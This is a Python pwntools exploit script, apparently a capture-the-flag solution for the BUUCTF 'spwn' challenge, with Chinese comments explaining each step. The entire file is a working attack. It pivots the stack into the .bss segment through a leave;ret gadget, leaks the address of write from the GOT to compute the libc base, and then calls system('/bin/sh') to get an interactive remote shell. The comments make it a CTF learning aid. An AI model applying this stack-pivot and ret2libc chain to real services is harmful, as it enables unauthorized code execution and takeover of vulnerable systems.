#!/usr/bin/python2
#coding=utf-8
from pwn import *

context(os = "linux", arch = "i386", log_level= "debug")
p = remote("node4.buuoj.cn", 25352)

elf = ELF("spwn")

bss_s = 0x0804A300				#将fake栈迁移到bss中
leave_ret = 0x08048511			#栈迁移所需要的的地址
write_plt = elf.plt["write"]	#plt表可以调用write函数
write_got = elf.got["write"]	#got表里有write函数的真实地址
main_addr = elf.symbols["main"]	#控制函数执行流需要再次回到主函数
# 需要打印出write的真实地址查出，并且让函数再次返回主函数
payload = b"aaaa" + p32(write_plt) + p32(main_addr)
payload += p32(1) + p32(write_got) + p32(4)
p.sendlineafter(b"name?", payload)
# 上面将一些执行流程写入了bss段
# 接下来的写入的buf在栈上，所以可以控制程序执行到bss段
payload = b"a" * 0x18 #这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前
payload += p32(bss_s) + p32(leave_ret)
p.sendlineafter(b"say?", payload)

write_addr = u32(p.recv(4)) #接收泄露的地址
libc = ELF('./libc-2.23.so')
libc_base = write_addr - libc.sym['write']#获取libc的基地址
system_addr = libc_base + libc.sym['system']#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))#通过获取到的libc的基地址和"/bin/sh"在libc中的地址可以得到"/bin/sh"在程序中的真实地址
# 第一次执行得到system函数地址后接下来会再次执行main函数
# 在这次有system函数的情况下再次进行相同的栈迁移执行system('/bin/sh')
payload = b"aaaa" + p32(system_addr) + p32(main_addr)
payload += p32(binsh_addr)
p.sendlineafter(b"name?", payload)

payload = b"a" * 0x18 + p32(bss_s) + p32(leave_ret)
p.sendlineafter(b"say?", payload)

p.interactive()
